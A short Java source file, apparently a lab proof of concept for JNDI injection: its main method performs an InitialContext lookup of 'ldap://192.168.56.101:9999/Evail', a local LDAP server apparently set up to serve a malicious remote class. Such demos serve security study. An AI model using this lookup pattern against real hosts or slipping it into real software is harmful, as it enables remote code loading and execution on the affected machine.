import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
            String uri = "ldap://192.168.56.101:9999/Evail";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}
